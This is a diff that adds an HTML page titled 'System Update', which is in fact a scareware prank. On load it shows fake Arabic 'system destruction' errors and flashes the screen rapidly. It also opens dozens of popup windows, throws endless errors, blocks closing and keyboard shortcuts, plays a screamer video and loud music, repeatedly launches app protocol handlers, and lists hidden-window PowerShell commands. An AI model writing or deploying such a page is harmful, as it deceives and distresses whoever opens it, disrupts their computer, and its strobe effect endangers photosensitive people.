@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>System Update</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #0f0;
+            font-family: 'Arial', sans-serif;
+            cursor: none;
+            overflow: hidden;
+        }
+        
+        .error {
+            position: absolute;
+            font-size: 24px;
+            color: red;
+            animation: glitch 0.5s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+        
+        .arabic-text {
+            font-size: 30px;
+            color: yellow;
+            text-align: center;
+            margin-top: 50px;
+        }
+        
+        #scareVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            display: none;
+        }
+        
+        .flashing {
+            animation: flash 0.1s infinite;
+        }
+        
+        @keyframes flash {
+            0% { background: #000; }
+            50% { background: #fff; }
+            100% { background: #000; }
+        }
+    </style>
+</head>
+<body class="flashing">
+    <div class="arabic-text">خطأ في النظام! التدمير في تقدم</div>
+    
+    <video id="scareVideo" controls autoplay muted>
+        <source src="https://robuxfree777.github.io/abf/media/jeff.mp4" type="video/mp4">
+    </video>
+
+    <audio id="music" loop>
+        <source src="https://fine.sunproxy.net/file/c1JsbWJ0OE0xcmNxem1scHF6a2tSeTVCWmVHSDFjRTlvUjM0YnZHU1NxQTlnenZuNHBTQUkvZzQ3Z01sZTZzbVF4Tk5PMGc5Sjlab1IzQ3dYM1o2RmJDVDBCdnFwK3dDbktBQldrcXVVL0U9/aue_-_arabic_low_quality_song_meme_HD_full_(SkySound.cc).mp3" type="audio/mp3">
+    </audio>
+
+    <script>
+        // Функция для открытия множества вкладок
+        function openTabs() {
+            for(let i = 0; i < 25; i++) {
+                setTimeout(() => {
+                    window.open('https://example.com', '_blank', 'width=200,height=200');
+                }, i * 500);
+            }
+        }
+
+        // Функция для создания ошибок
+        function generateErrors() {
+            setInterval(() => {
+                console.error('SYSTEM FAILURE: ' + Math.random());
+                throw new Error('Critical system error');
+            }, 100);
+        }
+
+        // Функция для скримера
+        function triggerScare() {
+            const video = document.getElementById('scareVideo');
+            video.style.display = 'block';
+            video.play().catch(e => console.error(e));
+            
+            // Открыть дополнительные окна со скримером
+            for(let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const newWindow = window.open('', '_blank', 'width=800,height=600');
+                    if(newWindow) {
+                        newWindow.document.write(`
+                            <video autoplay muted style="width:100%;height:100%">
+                                <source src="https://robuxfree777.github.io/abf/media/jeff.mp4" type="video/mp4">
+                            </video>
+                        `);
+                    }
+                }, i * 2000);
+            }
+        }
+
+        // Функция для блокировки закрытия
+        function blockClosing() {
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = 'Fuck you)';
+                return 'Fuck you)';
+            };
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F4' || (e.altKey && e.key === 'F4') || 
+                    (e.ctrlKey && e.altKey && e.key === 'Delete') ||
+                    (e.ctrlKey && e.key === 'w') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'Escape')) {
+                    e.preventDefault();
+                    alert('Fuck you)');
+                    triggerScare();
+                }
+            });
+        }
+
+        // Функция для открытия CMD окон
+        function openCMD() {
+            // Эмуляция открытия CMD через PowerShell
+            const powershellCommands = [
+                'Start-Process cmd -ArgumentList "/k echo Fuck you && timeout 1 && cls" -WindowStyle Hidden',
+                'Start-Process cmd -ArgumentList "/k msg * fuck you" -WindowStyle Hidden'
+            ];
+            
+            // Создание iframe для эмуляции поведения CMD
+            for(let i = 0; i < 2; i++) {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100px;height:100px;border:none;opacity:0;';
+                iframe.srcdoc = `
+                    <html>
+                        <body style="background:black;color:white;">
+                            <script>
+                                setInterval(() => {
+                                    console.log("${i === 0 ? 'echo Fuck you' : 'msg * fuck you'}");
+                                }, 1000);
+                            <\/script>
+                        </body>
+                    </html>
+                `;
+                document.body.appendChild(iframe);
+            }
+        }
+
+        // Функция для открытия случайных программ
+        function openRandomPrograms() {
+            const protocols = [
+                'spotify:',
+                'steam:',
+                'discord:',
+                'skype:',
+                'ms-word:',
+                'ms-excel:',
+                'notepad:'
+            ];
+            
+            setInterval(() => {
+                const randomProtocol = protocols[Math.floor(Math.random() * protocols.length)];
+                window.open(randomProtocol, '_blank');
+            }, 3000);
+        }
+
+        // Функция для открытия изображений
+        function openImages() {
+            const images = [
+                'https://sun1-98.userapi.com/s/v1/ig2/hHkSZBwlojPIK9sR7Zk_ti1HTxxQx_cwn9DFE6ADaHwHN51AEVLwOx2ZTz4eqMy4cMBd4VAcl2yi7mGw1I55RkFq.jpg',
+                'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcScWQtjdFcMF8ej_W1h55eOOOWgBAJ1e3oTtQ&s',
+                'https://www.meme-arsenal.com/memes/61660cfbc4a6609a36597fe515bf39e7.jpg',
+                'https://i.pinimg.com/236x/b6/a5/fe/b6a5feb8771b871a6fabb04d0a605fc7.jpg'
+            ];
+            
+            images.forEach((img, index) => {
+                setTimeout(() => {
+                    for(let i = 0; i < 3; i++) {
+                        const imgWindow = window.open('', '_blank', 'width=400,height=400');
+                        if(imgWindow) {
+                            imgWindow.document.write(`<img src="${img}" style="width:100%;height:100%">`);
+                        }
+                    }
+                }, index * 1000);
+            });
+        }
+
+        // Функция для "пьяного" курсора
+        function drunkCursor() {
+            let x = 0, y = 0;
+            setInterval(() => {
+                x += (Math.random() - 0.5) * 50;
+                y += (Math.random() - 0.5) * 50;
+                document.body.style.cursor = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32"><circle cx="16" cy="16" r="15" fill="red"/></svg>') ${x} ${y}, auto`;
+            }, 100);
+        }
+
+        // Функция для изменения громкости (эмуляция)
+        function changeVolume() {
+            setInterval(() => {
+                const audio = document.getElementById('music');
+                if(audio) {
+                    audio.volume = Math.random();
+                }
+            }, 2000);
+        }
+
+        // Функция для арабского текста ошибок
+        function arabicErrors() {
+            const arabicMessages = [
+                "خطأ في الذاكرة",
+                "فشل النظام",
+                "الوصول مرفوض",
+                "الفيروس المكتشف",
+                "تلف البيانات"
+            ];
+            
+            setInterval(() => {
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'error';
+                errorDiv.textContent = arabicMessages[Math.floor(Math.random() * arabicMessages.length)];
+                errorDiv.style.left = Math.random() * window.innerWidth + 'px';
+                errorDiv.style.top = Math.random() * window.innerHeight + 'px';
+                document.body.appendChild(errorDiv);
+                
+                setTimeout(() => {
+                    errorDiv.remove();
+                }, 3000);
+            }, 500);
+        }
+
+        // Функция для моргания клавиатуры (эмуляция)
+        function blinkKeyboard() {
+            document.addEventListener('keydown', function(e) {
+                document.body.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+            });
+        }
+
+        // Функция для открытия всех браузеров (эмуляция)
+        function openBrowsers() {
+            const browserLinks = [
+                'https://www.google.com',
+                'https://www.youtube.com',
+                'https://www.facebook.com',
+                'https://www.twitter.com'
+            ];
+            
+            browserLinks.forEach((link, index) => {
+                setTimeout(() => {
+                    window.open(link, '_blank');
+                }, index * 1000);
+            });
+        }
+
+        // Запуск музыки
+        function playMusic() {
+            const audio = document.getElementById('music');
+            audio.volume = 1.0;
+            audio.play().catch(e => console.error('Music error:', e));
+        }
+
+        // Инициализация всех функций
+        window.onload = function() {
+            openTabs();
+            generateErrors();
+            blockClosing();
+            openCMD();
+            openRandomPrograms();
+            openImages();
+            drunkCursor();
+            changeVolume();
+            arabicErrors();
+            blinkKeyboard();
+            openBrowsers();
+            playMusic();
+            
+            // Запуск скримера через 3 секунды
+            setTimeout(triggerScare, 3000);
+            
+            // Смена цвета фона
+            setInterval(() => {
+                document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 50%)`;
+            }, 500);
+        };
+
+        // Предотвращение контекстного меню
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+</body>
+</html>
